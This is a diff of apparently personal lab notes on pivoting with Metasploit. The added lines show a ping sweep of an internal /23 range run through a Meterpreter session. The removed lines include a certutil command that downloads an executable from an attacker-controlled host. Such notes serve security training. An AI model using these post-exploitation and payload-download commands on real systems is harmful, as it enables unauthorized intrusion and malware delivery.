@@ -216,12 +216,23 @@ Ethernet adapter Ethernet0:
 ```
 
 ## Using Metasploit to Pivot and Port forward
-### Create a Meterpreter Payload
+![[Pasted image 20251015205023.png]]
+
+First thing to do as above is scan the network range 172.16.6.0/23
+```bash
+meterpreter > background
+[*] Backgrounding session 1...
+msf6 exploit(multi/script/web_delivery) > use post/multi/gather/ping_sweep
+msf6 post(multi/gather/ping_sweep) > set RHOSTS 172.16.6.0/23
+RHOSTS => 172.16.6.0/23
+msf6 post(multi/gather/ping_sweep) > set SESSION 1
+SESSION => 1
+msf6 post(multi/gather/ping_sweep) > run
+
+[*] Performing ping sweep for IP range 172.16.6.0/23
+[+]     172.16.6.3 host found
+[+]     172.16.6.50 host found
+[+]     172.16.6.100 host found
 ```
 
-```
 
-### Certutil
-```
-certutil.exe -f -urlcache -split http://10.10.14.117:9090/update.exe update.exe
-```
